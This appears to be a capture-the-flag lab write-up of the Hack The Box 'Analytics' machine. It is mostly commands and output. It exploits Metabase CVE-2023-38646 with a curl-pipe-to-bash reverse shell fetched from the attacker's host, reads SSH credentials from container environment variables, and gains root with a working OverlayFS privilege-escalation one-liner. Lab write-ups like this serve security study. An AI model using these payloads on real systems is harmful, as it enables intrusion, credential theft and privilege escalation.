# easy - Analytics

## User

Ok, so hostname is being revealed:
```bash
~z➤ curl -I analytics.htb
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 10 Oct 2023 20:24:22 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://analytical.htb/

~z➤ curl -I analytical.htb
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 10 Oct 2023 20:24:56 GMT
Content-Type: text/html
Content-Length: 17169
Last-Modified: Fri, 25 Aug 2023 15:24:42 GMT
Connection: keep-alive
ETag: "64e8c7ba-4311"
Accept-Ranges: bytes
```

While nmap says the regular ports 22 and 80 are open:
```bash
~z➤ sudo nmap -n -Pn -sV -O -T4 analytics.htb
...
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 16:24 -04
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

### Reviewing HTML source code

Here what seems interesting:
```html
<a class="nav-item nav-link" href="http://data.analytical.htb">Login</a>
<link rel="stylesheet" href="css/jquery.mCustomScrollbar.min.css">
<link rel="stylesheet" href="css/owl.carousel.min.css">
<link rel="stylesheet" href="css/responsive.css">
<p class="copyright_text">Copyright 2023 All Right Reserved By.<a href="https://html.design"> analytical.htb</p>
```

Also some possible usernames are being leaked:
```bash
~z➤ curl -s analytical.htb | elinks --dump
...
                                    Our Team
Jonnhy Smith
   Chief Data Officer
Alex Kirigo
   Data Engineer
Daniel Walker
   Data Analyst
Jonnhy Smith
   Chief Data Officer
Alex Kirigo
   Data Engineer
Daniel Walker
   Data Analyst
Jonnhy Smith
   Chief Data Officer
Alex Kirigo
   Data Engineer
Daniel Walker
   Data Analyst

                                   Contact us
...
   due@analytical.com
   demo@analytical.com
...
```

Turns out the application is running a **metabase** based app. Which seems to be vulnerable to CVE-2023-38646 ([Youtube PoC]()https://www.youtube.com/watch?v=b51LPjD-uTo).

There are many PoC around online.

Let's prepare a `r` bash reverse shell file, serve it with python http module and test the PoC:
```bash
~z➤ python CVE-2023-38646.py -u http://data.analytical.htb -c "curl http://10.10.14.171:6666/r|bash"
Success get token!
Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
Command: curl http://10.10.14.171:6666/r|bash
Base64 Encoded Command: Y3VybCBodHRwOi8vMTAuMTAuMTQuMTcxOjY2NjYvcnxiYXNo
Exploit success !
Check on your own to validity!
```

And we've got our rev shell:
```bash
z➤ nc -lvnp 55555
Connection from 10.129.140.149:52766
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
daf268230e5d:/$ id
id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
```

### Pivoting outside the container

Initially it seemed weird to me that `$USER` path didn't have the user.txt file, then I noticed we are in a container and the `env` vars has sensitive information:
```bash
daf268230e5d:~$ ls /home/metabase
plss /home/metabase

daf268230e5d:~ps aux
ps aux
PID   USER     TIME  COMMAND
    1 metabase  4:01 java -XX:+IgnoreUnrecognizedVMOptions -Dfile.encoding=UTF-8 -Dlogfile.path=target/log -XX:+CrashOnOutOfMemoryError -server -jar /app/metabase.jar
   97 metabase  0:00 bash -c {echo,Y3VybCBodHRwOi8vMTAuMTAuMTQuMTcxOjY2NjYvcnxiYXNo}|{base64,-d}|{bash,-i}
  101 metabase  0:00 bash -i
  103 metabase  0:00 bash
  104 metabase  0:00 bash -i
  114 metabase  0:00 ps aux

daf268230e5d:~$ env
...
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

So we were not actually pivoting, we just found valid ssh creds:
```bash
~z➤ ssh metalytics@analytics.htb
Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
...
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
metalytics@analytics:~$ ls
user.txt
```
## Root

No sudo
```bash
metalytics@analytics:~$ sudo -l
[sudo] password for metalytics:
Sorry, user metalytics may not run sudo on localhost.
```

Well, this one is interesting. I didn't know about this, we are in an Ubuntu 22 which turns out to be vulnerable to a combination of CVEs about filesystem overlay and escalation of privileges. CVEs are CVE-2023-2640 and CVE-2023-32629.

Proof of Concept:
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

We just need to run the command `bash` instead of `id` and we become root:
```bash
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
> setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash")'
root@analytics:~# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
```

## TODOs
- Review in depth CVE-2023-38646 
- Review in depth CVE-2023-2640 & CVE-2023-32629
